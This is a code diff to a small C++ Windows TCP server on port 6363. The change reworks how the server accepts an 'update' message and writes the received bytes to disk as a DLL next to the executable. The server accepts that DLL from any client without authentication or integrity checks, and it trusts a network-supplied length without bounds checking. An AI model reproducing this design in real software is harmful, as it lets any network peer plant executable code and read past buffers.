@@ -48,19 +48,17 @@ Returns the result of the proper requested function.
 */
 int OnAccept(char* buffer)
 {
-	if (buffer[0] == 'u')
+	char c_Type = buffer[0];
+	int n_Length = *(int*)(buffer + 1);
+	char* s_Value = buffer + 5;
+
+	switch (c_Type)
 	{
-		return RequestUpdate(buffer);
-	}
-	else if (expectUpdate)
-	{
-		return Update(buffer);
-	}
-	else
-	{
-		IntFunc toRun = fList[buffer];
-		if (toRun) return toRun();
-		else return Echo(buffer);
+	case 'u':
+		return Update(n_Length, s_Value);
+	default:
+		return Echo(buffer);
+		break;
 	}
 }
 
@@ -70,7 +68,6 @@ Starting a new tcp connection and setting a socket om port 6363
 void StartConnection()
 {
 	const int port = 6363;
-	expectUpdate = false;
 
 	//fList.emplace(std::make_pair("echo", Echo));
 
@@ -108,29 +105,14 @@ const int Echo(char* buffer)
 }
 
 /**
-Set a flag to prepare to receive a binary data
-
-@return -1.
-*/
-const int RequestUpdate(char* buffer)
-{
-	std::cout << "Expecting Update..." << std::endl;
-	expectUpdate = true;
-
-	// set the dll size in bytes
-	downloadSize = atoi(buffer + 1);
-
-	return -1;
-}
-
-/**
 After receiving an update command - digest a binary data and create a DLL file
 Returns 0 if operation failed along the way.
 
-@param buffer: The data to convert into DLL
+@param length: The length of the data
+@param value: The data to convert into DLL
 @return 0 for a failure.
 */
-const int Update(char* buffer)
+const int Update(int length, char* value)
 {
 	char exePath[MAX_PATH];
 
@@ -154,8 +136,8 @@ const int Update(char* buffer)
 
 	if (WriteFile(
 		hFile,							// file handler
-		buffer,							// data
-		downloadSize,					// nNumberOfBytesToWrite 
+		value,							// data
+		length,					// nNumberOfBytesToWrite 
 		NULL,							// lpNumberOfBytesWritten 
 		NULL							// lpOverlapped 
 	)) 
@@ -164,7 +146,6 @@ const int Update(char* buffer)
 
 		auto e = GetLastError();
 
-		expectUpdate = false;
 		CloseHandle(hFile);
 		return 0;
 	}
